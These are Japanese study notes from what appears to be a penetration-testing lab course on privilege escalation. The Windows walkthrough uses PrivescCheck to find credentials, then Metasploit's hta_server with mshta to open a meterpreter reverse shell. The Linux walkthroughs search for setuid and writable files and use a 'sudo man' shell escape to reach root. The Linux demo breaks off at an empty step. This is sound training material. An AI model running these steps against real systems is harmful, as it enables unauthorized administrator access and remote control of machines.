エスカレーション
windowsの権限昇格
windowsの権限昇格の脆弱性の特定
・Windowsで権限を昇格させるためには、まずターゲットシステムに存在する権限昇格の脆弱性を特定する必要がある。
・このプロセスには、あなたがアクセスしたターゲットの種類によって大きく異なる。
Windowsの権限昇格は、Windowsのバージョンやシステム固有の設定に応じた多数のテクニックを利用して実行する
・このプロセスは非常に手間がかかりかつ時間がかかる場合がある
そのため、権限昇格脆弱性の特定のプロセスは自動化することが推奨される。
これは、さまざまな自動化スクリプトを使用することで可能

・PrivesecCheckスクリプトは、Windowsにおける一般的な設定ミスを列挙し、それらがローカル権限昇格に悪用できるかどうかを
調査することを目的にしている。
また、潜在的に悪用やポストエクスプロイトに役立つさまざまな情報を収集する。

windowsの権限昇格

demo windows：PrivesecCheck
1) ターゲットマシンに侵入して、ターゲットマシンと攻撃者マシンを切り替えられるようにする
2) powershellを開いて、whoamiで現在のユーザーを確認する。
3) PrivesecCheckPowerShellスクリプトを実行して、ローカル権限昇格に悪用される可能性の設定ミスを見つけるために、
現在のフォルダをPrivesecCheckフォルダに切り替える
cd C:\Users\student\Desktop\PrivescCheck
ls
4) 以下のコマンドで、PrivescCheck.ps1スクリプトを実行して、管理者ユーザーのクレデンシャル情報を確認する。
powershell -ep bypass -c ". .\PrivesecCheck.ps1; Invoke-PrivescCheck"
5) 以下のコマンドで、検出された資格情報とrunas.exeを使用して、管理者ユーザとしてコマンドプロンプトを実行する
runas.exe /user:administrator cmd
passcord
whoami
6) kalilinuxに切り替える。
7) hta_serverモジュールを実行して、meterpreterシェルを起動する。
msfconsole -q
use exploit/windows/misc/hta_server
exploit
→これ実行できると、powershell経由でペイロードが実行される。
8) 生成されたペイロードをコピーして、mshtaコマンドを使用して、cmd.exeで実行して、meterpreterシェルを取得する
9) 被害者マシンに切り替える
　meterpreterシェルを取得する
mshta.exe 生成したペイロード
10) 攻撃者マシンで、
sessions -i 1でセッションID１に切り替える
フラグを読むために、cd C:\\Users\\Administrator\\Desktop
dir 
cat flag.txtで読む。

ユーザーアカウントのクレデンシャルを取得した後、Windowsターゲットで認証するためにSMB,RDP,WinRMを使用することができる。

Linuxの権限昇格
・LinEnnumは、Linuxの一般的なローカル列挙作業を自動化し、さらに権限昇格の脆弱性を特定するためのシンプルなBashスクリプト

demo Linux権限昇格
1) pingでターゲットへの稼働を確認する。
2) ブラウザで、http://ターゲットドメイン:8000で実行されているサービスを特定する
→ここで、linuxターミナルインターフェースで実行され、サービスが稼働していることを確認する
3) find / -not -type l -perm -o+wで書き込み可能なファイルを検索する
4) 書き込み可能なファイルを使って、存在を確認する
ls -l 3)で見つけたファイル
cat 3)で見つけたファイル
5) 

Linux権限昇格-sudo昇格-
demo linux権限昇格-sudo昇格-
1) pingでターゲットホストへの稼働を確認する
2) ブラウザを使って、http://target.ine.local:8000を検索してlinuxターミナルを起動する
3) find / -user root -perm -4000 -exec ls -ldb {} \;を使って、setuidプログラムを見つけることから始める
4) sudo -lで設定ミスを見つける
5) 4)でmanエントリーが可能になっている場合は、sudo man lsを実行して、設定ミスをつく
6) !/bin/bashで対話型を起動する
7) whoamiでユーザ確認を行う
8) cd /root
9) ls -l
10) cat flag.txtで中身を確認する。
